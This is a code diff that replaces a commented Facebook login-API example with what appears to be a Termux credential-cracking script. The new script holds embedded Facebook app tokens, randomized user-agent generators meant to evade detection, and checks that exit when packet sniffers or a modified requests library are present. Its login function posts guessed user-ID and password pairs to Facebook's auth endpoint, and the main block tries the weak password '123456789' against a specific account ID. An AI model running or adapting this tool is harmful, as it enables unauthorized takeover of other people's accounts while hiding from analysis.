@@ -1,132 +1,396 @@
-###----------[ THE REQUIRED MODULES ]---------- ###
-import requests,random,uuid,string,hashlib,json
-ses=requests.Session()
+# -*- coding: utf-8 -*-
+# Decompiled from Python 3.12 bytecode
+#ARNOLD XD & RIZWAN &ITZ CHUZA
+import os
+import re
+import time
+import uuid
+import hashlib
+import random
+import string
+import requests
+import sys
+import json
+import urllib
+from bs4 import BeautifulSoup
+from random import randint as rr
+from concurrent.futures import ThreadPoolExecutor as tred
+from os import system
+from datetime import datetime
+import sys
 
-###----------[ GENERATING DATA ]---------- ###
-# Hash : hashlib.md5(hashlib.sha1(str(int(round(time.time()))).encode()).hexdigest().encode()).hexdigest()
-# Hash Result = str(Hash[0:8])+"-"+str(Hash[4:8])+"-"+str(Hash[4:12])+"-"+str(Hash[4:16])+"-"+str(Hash[12:20])
-# Uuid : str(uuid.uuid4())
-### Recommended Use Uuid ###
+file_name = "res.txt"
+sys.stdout.write('\x1b]2; ARNOLD 🔥 \x07')
 
-###----------[ APP ID AND TOKEN ]---------- ###
-# Ads Manager Android : 438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28
-# Facebook Android : 350685531728|62f8ce9f74b12f84c123cc23437a4a32
-# Facebook iPhone : 6628568379|c1e620fa708a1d5696fb991c1bde5662
-# Ads Manager App for iOS : 1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae
-# Instagram Web : 1217981644879628|65a937f07619e8d4dce239c462a447ce
-# Instagram Android : 567067343352427|f249176f09e26ce54212b472dbab8fa8
-### Example : App ID|Token/Sig ###
+# Suppress InsecureRequestWarning
+from requests.exceptions import ConnectionError
+from requests import api, models, sessions
+requests.urllib3.disable_warnings()
 
-###----------[ URL FOR REQUESTS POST ]---------- ###
-# Api : https://api.facebook.com/auth/login
-# B-Api : https://b-api.facebook.com/auth/login
-# Graph : https://graph.facebook.com/auth/login/
-# B-Graph : https://b-graph.facebook.com/auth/login
-### In The Url Can Also Use auth.login With The Condition That Headers Must Be Added {"method":"auth.login"} ###
+# --- Anti-tampering and Security Checks ---
+# The script checks if the source code of the 'requests' library has been modified
+# or if packet sniffing tools are being used.
+try:
+    api_body = open(api.__file__, 'r').read()
+    models_body = open(models.__file__, 'r').read()
+    session_body = open(sessions.__file__, 'r').read()
+    word_list = ['print', 'lambda', 'zlib.decompress']
+    for word in word_list:
+        if word in api_body or word in models_body or word in session_body:
+            exit()
+except:
+    pass
 
-###----------[ EXAMPLE USER AGENT AND PARSER ]---------- ###
-# User Agent : Davik/2.1.0 (Linux; U; Android 4.0.0; Infinix X682B Build/Build/QP1A.190711.020; wv) [FBAN/AndroidSampleApp;FBAV/348.719.618.179;FBLC/en_US;FBBV/709835163;FBCR/Zong;FBMF/Infinix;FBBD/Infinix;FBDV/Infinix X682B;FBSV/12.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.3312501,width=800,height=1216};FB_FW/1;]
-# Device : Infinix X682B
-# Versi Android/OS : 4.0.0
-# App Version : 348.719.618.179
-# Language : en_US
-# Country Code : US
 
-### ↓↓↓↓↓↓[ FOR EXAMPLE CODE TO REQUESTS ]↓↓↓↓↓↓ ###
+class sec:
+    """
+    A security class to detect debugging and packet sniffing tools.
+    """
+    def __init__(self):
+        self.__module__ = __name__
+        self.__qualname__ = 'sec'
+        # Paths to check for modifications
+        paths = [
+            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py',
+            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py',
+            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py'
+        ]
+        for path in paths:
+            if 'print' in open(path, 'r').read():
+                self.fuck()
+        # Check for HTTPCanary (a packet sniffing app)
+        if os.path.exists('/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png'):
+            self.fuck()
+        if os.path.exists('/storage/emulated/0/Android/data/com.guoshi.httpcanary'):
+            self.fuck()
 
-###----------[ DATA FOR REQUESTS]---------- ###
-data = {
-	"email": "100004102814210", # --> Email Facebook
-	"password": "123456789", # --> Password Facebook
-	"adid": str(uuid.uuid4()),
-	"device_id": str(uuid.uuid4()),
-	"family_device_id": str(uuid.uuid4()),
-	"session_id": str(uuid.uuid4()),
-	"advertiser_id": str(uuid.uuid4()),
-	"reg_instance": str(uuid.uuid4()),
-	"machine_id": "".join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(24)),
-	"locale": "en_US", # --> From Parsing User Agent
-	"country_code": "US", # --> From Parsing User Agent
-	"client_country_code": "US", # --> From Parsing User Agent
-	"cpl": "true",
-	"source": "login",
-	"format": "json",
-	"credentials_type": "password",
-	"error_detail_type": "button_with_disabled",
-	"generate_session_cookies": "1",
-	"generate_analytics_claim": "1",
-	"generate_machine_id": "1",
-	"tier": "regular",
-	"device": "Infinix X682B", # --> From Parsing User Agent
-	"os_ver": "4.0.0", # --> From Parsing User Agent
-	"app_id": "350685531728", # --> From App ID
-	"app_ver": "348.719.618.179", # --> From Parsing User Agent
-	"meta_inf_fbmeta": "NO_FILE", # --> Optional Value
-	"currently_logged_in_userid" : "0",
-	"fb_api_req_friendly_name": "authenticate",
-	"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
-	"fb4a_shared_phone_cpl_experiment": "fb4a_shared_phone_nonce_cpl_at_risk_v3",
-	"fb4a_shared_phone_cpl_group": "enable_v3_at_risk",
-	"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32", # --> Use App ID|Token/Sig
-	"api_key": "882a8490361da98702bf97a021ddc14d",
-	"sig":"62f8ce9f74b12f84c123cc23437a4a32"} # --> Use App ID|Token/Sig
-	
-	###----------[ Many Other Data With Different Functions ]---------- ###
-	#"method": "auth.login", # --> Under Certain Conditions (read the request description above)
-	#"relative_url": "method/auth.login",
-	#"omit_response_on_success": "false",
-	#"logged_out_id": str(uuid.uuid()),
-	#"interface": "wifi",
-	#"reason", "unknown",
-	#"headwind_version", "3",
-	#"headwind_cursor", "{}",
-	#"hash_id": str(uuid.uuid()),
-	#"community_id": "",
-	#"try_num": "1",
-	#"cds_experiment_group": "-1",
-	#"enroll_misauth": "false",
-	#"jazoest", "",
-	#"encrypted_msisdn": "",
-	#"sim_country": "id",
-	#"network_country": "id",
-	#"should_query_for_animation": "true",
-	#"flow": "CONTROLLER_INITIALIZATION",
-	#"query_hash": "".join(random.choice(string.ascii_uppercase + string.digits) for _ in range(40)),
+    def fuck(self):
+        """
+        Terminates the script if tampering is detected.
+        """
+        print(' \x1b[1;32m Congratulations ! ')
+        self.linex()
+        exit()
 
-###----------[ HEADERS FOR REQUESTS ]---------- ###
-content_lenght = ("&").join([ "%s=%s" % (key, value) for key, value in data.items() ])
-headers = {
-	"User-Agent": ugent,
-	"Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32", # --> Use App ID|Token/Sig
-	"X-FB-SIM-HNI": str(random.randint(20000, 40000)),
-	"X-FB-Net-HNI": str(random.randint(20000, 40000)),
-	"X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
-	"X-FB-Connection-Quality": "GOOD",
-	"X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
-	"X-Fb-Net-Sid": "",
-	"X-FB-HTTP-Engine": "Liger",
-	"X-Tigon-Is-Retry": "False",
-	"X-FB-Friendly-Name": "authenticate",
-	"Content-Type": "application/x-www-form-urlencoded",
-	"Content-Length": str(len(content_lenght))}
-	
-	###----------[ Many Other Headers With Different Functions ]---------- ###
-	#"server_timestamps": "true",
-	#"fb_api_caller_class": "graphservice",
-	#"fb_api_analytics_tags": "["GraphServices"]",
-	#"request_token": Token,
-	#"Priority": "u=3, i",
-	#"device_id": str(uuid.uuid4()),
-	#"family_device_id": str(uuid.uuid4()),
-	#"X-FB-Client-IP": "True",
-	#"X-FB-Server-Cluster": "True",
-	#"X-MSGR-Region": "FRC"
+    def linex(self):
+        print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 
-###----------[ REQUESTS POST ]---------- ###
-post = ses.post("https://b-graph.facebook.com/auth/login",params=data,headers=headers)
-print(post.json())
 
-###----------[ GENERATE COOKIE FROM REQUESTS ]---------- ###
-coki = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
-print(coki)
-######### --------------------------------------- #########
+# Global variables
+method = []
+oks = []
+cps = []
+loop = 0
+user = []
+
+# Color codes for terminal output
+X = '\x1b[1;37m'
+rad = '\x1b[38;5;196m'
+G = '\x1b[38;5;46m'
+Y = '\x1b[38;5;220m'
+PP = '\x1b[38;5;203m'
+RR = '\x1b[38;5;196m'
+GS = '\x1b[38;5;40m'
+W = '\x1b[1;37m'
+
+
+import random
+
+def windows():
+    """
+    Generates a random Windows User-Agent string.
+    Covers 2010–2025 (Chrome 8 → Chrome 139).
+    """
+    # Early Chrome (2010–2011, Windows XP/7)
+    aV = str(random.choice(range(10, 20)))
+    A = (
+        f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) "
+        f"AppleWebKit/534.{aV} (KHTML, like Gecko) "
+        f"Chrome/{str(random.choice(range(8, 15)))}.0.{str(random.choice(range(500, 1200)))}.0 "
+        f"Safari/534.{aV}"
+    )
+
+    # Mid-era Chrome (2012–2014, Windows 7/8)
+    bV = str(random.choice(range(1, 36)))
+    bx = str(random.choice(range(34, 38)))
+    bz = f'5{bx}.{bV}'
+    B = (
+        f"Mozilla/5.0 (Windows NT {str(random.choice(range(6, 7)))}.{str(random.choice(['0', '1', '2']))}) "
+        f"AppleWebKit/{bz} (KHTML, like Gecko) "
+        f"Chrome/{str(random.choice(range(20, 45)))}.0.{str(random.choice(range(1200, 2800)))}.{str(random.choice(range(1, 150)))} "
+        f"Safari/{bz}"
+    )
+
+    # Transition era (2015–2017, WOW64 builds)
+    cV = str(random.choice(range(1, 36)))
+    cx = str(random.choice(range(34, 38)))
+    cz = f'5{cx}.{cV}'
+    C = (
+        f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['1', '2', '3']))}; WOW64) "
+        f"AppleWebKit/{cz} (KHTML, like Gecko) "
+        f"Chrome/{str(random.choice(range(45, 70)))}.0.{str(random.choice(range(2800, 5000)))}.{str(random.choice(range(50, 200)))} "
+        f"Safari/{cz}"
+    )
+
+    # Modern Chrome (2021–2025, Windows 10/11)
+    latest_build = random.randint(6000, 9000)
+    latest_patch = random.randint(50, 200)
+    D = (
+        f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) "
+        f"AppleWebKit/537.36 (KHTML, like Gecko) "
+        f"Chrome/{random.choice(range(100, 139))}.0.{latest_build}.{latest_patch} "
+        f"Safari/537.36"
+    )
+
+    return random.choice([A, B, C, D])
+
+
+def window11():
+    """
+    Generates another variant of a random Windows User-Agent string.
+    """
+    aV = str(random.choice(range(10, 20)))
+    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
+    bV = str(random.choice(range(1, 36)))
+    bx = str(random.choice(range(34, 38)))
+    bz = f'5{bx}.{bV}'
+    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
+    cV = str(random.choice(range(1, 36)))
+    cx = str(random.choice(range(34, 38)))
+    cz = f'5{cx}.{cV}'
+    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
+    latest_build = rr(6000, 9000)
+    latest_patch = rr(100, 200)
+    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
+    return random.choice([A, B, C, D])
+
+def window21():
+    """
+    Generates another variant of a random Windows User-Agent string.
+    Covers 2010–2025 era (Chrome 40 to 139).
+    Each UA matches realistic year-specific NT and Chrome versions.
+    """
+
+    # Old WebKit/Chrome (2010–2013) → Windows 7 + Chrome 40–49
+    aV = str(random.choice(range(10, 20)))
+    A = (
+        f"Mozilla/5.0 (Windows NT 6.1; WOW64) "
+        f"AppleWebKit/534.{aV} (KHTML, like Gecko) "
+        f"Chrome/{random.choice(range(40, 50))}.0.{random.choice(range(2000, 4000))}.0 "
+        f"Safari/534.{aV}"
+    )
+
+    # Mid-era Chrome (2014–2016) → Windows 8/8.1 + Chrome 50–69
+    bV = str(random.choice(range(1, 36)))
+    bx = str(random.choice(range(34, 38)))
+    bz = f"5{bx}.{bV}"
+    B = (
+        f"Mozilla/5.0 (Windows NT {random.choice(['6.2', '6.3'])}; WOW64) "
+        f"AppleWebKit/{bz} (KHTML, like Gecko) "
+        f"Chrome/{random.choice(range(50, 70))}.0.{random.choice(range(3000, 5000))}.{random.choice(range(50, 200))} "
+        f"Safari/{bz}"
+    )
+
+    # Transition era (2017–2020) → Windows 10 + Chrome 70–89
+    cV = str(random.choice(range(1, 36)))
+    cx = str(random.choice(range(34, 38)))
+    cz = f"5{cx}.{cV}"
+    C = (
+        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+        f"AppleWebKit/{cz} (KHTML, like Gecko) "
+        f"Chrome/{random.choice(range(70, 90))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} "
+        f"Safari/{cz}"
+    )
+
+    # Modern Chrome (2021–2025) → Windows 10/11 + Chrome 100–139
+    latest_build = random.randint(6000, 9000)
+    latest_patch = random.randint(100, 200)
+    D = (
+        f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) "
+        f"AppleWebKit/537.36 (KHTML, like Gecko) "
+        f"Chrome/{random.choice(range(100, 139))}.0.{latest_build}.{latest_patch} "
+        f"Safari/537.36"
+    )
+
+    return random.choice([A, B, C, D])
+
+import random
+
+def arnold_2008():
+    """
+    Special: Windows + Early Browsers (2008 era, FB old IDs).
+    Covers XP/Vista + IE7/8, Firefox 2/3, Chrome 1–2, Safari 3/4.
+    """
+    nt = random.choice(["5.1", "6.0"])  # XP, Vista
+
+    # IE7/8
+    ie_ver = random.choice(["7.0", "8.0"])
+    A = f"Mozilla/4.0 (compatible; MSIE {ie_ver}; Windows NT {nt}; Trident/{'3.1' if ie_ver=='7.0' else '4.0'})"
+
+    # Firefox 2–3
+    ff_major = random.choice([2, 3])
+    B = f"Mozilla/5.0 (Windows NT {nt}; rv:{ff_major}.0) Gecko/20071127 Firefox/{ff_major}.0"
+
+    # Chrome 1–2
+    chrome_ver = f"{random.randint(1,2)}.0.{random.randint(150, 300)}.{random.randint(0,99)}"
+    C = f"Mozilla/5.0 (Windows; U; Windows NT {nt}; en-US) AppleWebKit/525.{random.randint(0,20)} " \
+        f"(KHTML, like Gecko) Chrome/{chrome_ver} Safari/525.{random.randint(0,20)}"
+
+    # Safari 3–4
+    safari_ver = random.choice(["525.26", "528.16"])
+    D = f"Mozilla/5.0 (Windows; U; Windows NT {nt}; en-US) AppleWebKit/{safari_ver} (KHTML, like Gecko) " \
+        f"Version/{random.choice(['3.2','4.0'])} Safari/{safari_ver}"
+
+    return random.choice([A, B, C, D])
+
+
+def arnold_1():
+    """
+    Windows UA (2009–2016).
+    Chrome 4–55, Firefox 3–50, IE 8–11.
+    """
+    chrome_ver = f"{random.randint(4, 55)}.0.{random.randint(200, 4200)}.{random.randint(0, 250)}"
+    A = f"Mozilla/5.0 (Windows NT {random.choice(['5.1','6.0','6.1','6.2','6.3'])}; " \
+        f"{random.choice(['en-US','en-GB','fr-FR','de-DE'])}) AppleWebKit/537.36 " \
+        f"(KHTML, like Gecko) Chrome/{chrome_ver} Safari/537.36"
+
+    ff_major = random.randint(3, 50)
+    B = f"Mozilla/5.0 (Windows NT {random.choice(['5.1','6.0','6.1','6.2','6.3'])}; rv:{ff_major}.0) " \
+        f"Gecko/20100101 Firefox/{ff_major}.0"
+
+    ie_ver = random.choice(["8.0","9.0","10.0","11.0"])
+    trident_map = {"8.0":"4.0","9.0":"5.0","10.0":"6.0","11.0":"7.0"}
+    C = f"Mozilla/5.0 (compatible; MSIE {ie_ver}; Windows NT {random.choice(['5.1','6.1','6.3'])}; " \
+        f"Trident/{trident_map[ie_ver]})"
+
+    return random.choice([A, B, C])
+
+
+def arnold_2():
+    """
+    Android UA (2010–2016).
+    Popular Samsung, Nexus, HTC, LG, Sony, Micromax.
+    """
+    android_ver = random.choice([
+        "2.3.6","4.0.4","4.1.2","4.2.2","4.3",
+        "4.4.2","5.0.2","5.1.1","6.0.1"
+    ])
+    devices = [
+        "GT-I9100","GT-I9300","GT-N7100","GT-I9500","SM-G900F","SM-G920F","SM-N9005",
+        "Nexus 4","Nexus 5","Nexus 7","Nexus 10",
+        "HTC One X","HTC One M7","HTC One M8",
+        "LG-P990","LG-D802","LG-H815",
+        "Xperia Z","Xperia Z1","Xperia Z2","Xperia Z3","Xperia Z5",
+        "Micromax A110","Micromax A116"
+    ]
+    device = random.choice(devices)
+    chrome_ver = f"{random.randint(18, 55)}.0.{random.randint(800, 4200)}.{random.randint(0, 300)}"
+
+    return f"Mozilla/5.0 (Linux; Android {android_ver}; {device}) " \
+           f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver} Mobile Safari/537.36"
+
+
+def arnold_3():
+    """
+    iOS UA (2010–2016).
+    iPhone/iPad/iPod Safari builds.
+    """
+    ios_ver = random.choice([
+        "4_3_5","5_1_1","6_1_6","7_1_2","8_4","9_3_5","10_3_3"
+    ])
+    devices = ["iPhone","iPad","iPod touch"]
+    device = random.choice(devices)
+
+    safari_map = {
+        "4_3_5": ("533.17.9","5.0"),
+        "5_1_1": ("534.46","5.1"),
+        "6_1_6": ("536.26","6.0"),
+        "7_1_2": ("537.51.2","7.0"),
+        "8_4":   ("600.1.4","8.0"),
+        "9_3_5": ("601.1","9.0"),
+        "10_3_3":("603.3.8","10.0"),
+    }
+    safari_ver, version_str = safari_map[ios_ver]
+
+    return f"Mozilla/5.0 ({device}; CPU {device} OS {ios_ver} like Mac OS X) " \
+           f"AppleWebKit/{safari_ver} (KHTML, like Gecko) Version/{version_str} Mobile/14G60 Safari/{safari_ver}"
+
+
+def arnold_all():
+    """
+    Random UA (2008–2016) across Windows, Android, iOS.
+    """
+    return random.choice([arnold_2008(), arnold_1(), arnold_2(), arnold_3()])
+
+
+def login_1(uid, pw):
+    """
+    Login attempt method 1 with enhanced cookie capture and saving.
+    """
+    global loop, oks  # Assuming 'oks' is a global list defined elsewhere
+    session = requests.session()
+    try:
+        sys.stdout.write(
+            f"\r\r\x1b[38;5;195m[\x1b[1;37mARNOLD-XD\x1b[38;5;195m]"
+            f"\x1b[38;5;196m•\x1b[38;5;192m{loop}\x1b[38;5;195m|\x1b[38;5;195m|"
+            f"\x1b[1;37mOK\x1b[38;5;195m|\x1b[38;5;195m|"
+            f"\x1b[38;5;192m{len(oks)}"
+        )
+        sys.stdout.flush()
+        data = {
+            'adid': str(uuid.uuid4()),
+            'format': 'json',
+            'device_id': str(uuid.uuid4()),
+            'cpl': 'true',
+            'family_device_id': str(uuid.uuid4()),
+            'credentials_type': 'device_based_login_password',
+            'error_detail_type': 'button_with_disabled',
+            'source': 'device_based_login',
+            'email': str(uid),
+            'password': str(pw),
+            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+            'generate_session_cookies': '1',
+            'meta_inf_fbmeta': '',
+            'advertiser_id': str(uuid.uuid4()),
+            'currently_logged_in_userid': '0',
+            'locale': 'en_US',
+            'client_country_code': 'US',
+            'method': 'auth.login',
+            'fb_api_req_friendly_name': 'authenticate',
+            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
+            'api_key': '882a8490361da98702bf97a021ddc14d'
+        }
+        headers = {
+            'User-Agent': arnold_all(),  
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Host': 'graph.facebook.com',
+            'X-FB-Net-HNI': '25227',
+            'X-FB-SIM-HNI': '29752',
+            'X-FB-Connection-Type': 'MOBILE.LTE',
+            'X-Tigon-Is-Retry': 'False',
+            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
+            'x-fb-device-group': '5120',
+            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+            'X-FB-Request-Analytics-Tags': 'graphservice',
+            'X-FB-HTTP-Engine': 'Liger',
+            'X-FB-Client-IP': 'True',
+            'X-FB-Server-Cluster': 'True',
+            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
+        }
+        res = session.post(
+            'https://b-graph.facebook.com/auth/login',
+            data=data,
+            headers=headers,
+            allow_redirects=False
+        ).json()
+
+        print(res)
+
+        loop += 1
+    except:
+        time.sleep(5)
+
+if __name__ == '__main__':
+    uid = "100004305306407"
+    pw = "123456789"
+    login_1(uid, pw)
